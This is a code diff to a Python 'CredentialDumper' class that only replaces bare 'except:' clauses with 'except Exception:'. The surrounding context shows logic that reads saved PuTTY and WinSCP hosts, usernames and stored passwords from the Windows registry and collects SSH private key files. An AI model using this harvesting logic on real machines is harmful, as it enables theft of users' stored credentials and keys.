@@ -261,7 +261,7 @@ class CredentialDumper:
                     try:
                         host = winreg.QueryValueEx(session_key, "HostName")[0]
                         user = winreg.QueryValueEx(session_key, "UserName")[0]
-                    except:
+                    except Exception:
                         pass
 
                     if host:
@@ -281,7 +281,7 @@ class CredentialDumper:
                     break
 
             winreg.CloseKey(putty_key)
-        except:
+        except Exception:
             pass
 
         # WinSCP
@@ -304,7 +304,7 @@ class CredentialDumper:
                         host = winreg.QueryValueEx(session_key, "HostName")[0]
                         user = winreg.QueryValueEx(session_key, "UserName")[0]
                         password = winreg.QueryValueEx(session_key, "Password")[0]
-                    except:
+                    except Exception:
                         pass
 
                     if host:
@@ -325,7 +325,7 @@ class CredentialDumper:
                     break
 
             winreg.CloseKey(winscp_key)
-        except:
+        except Exception:
             pass
 
         return DumpResult(True, "registry", credentials)
@@ -430,7 +430,7 @@ class CredentialDumper:
                                 first_line = f.readline()
                                 if "PRIVATE KEY" in first_line:
                                     is_key = True
-                        except:
+                        except Exception:
                             continue
 
                     if is_key:
@@ -453,7 +453,7 @@ class CredentialDumper:
                             )
                             credentials.append(cred)
                             self._log(f"Found SSH key: {item_path}")
-                        except:
+                        except Exception:
                             continue
 
             except PermissionError:
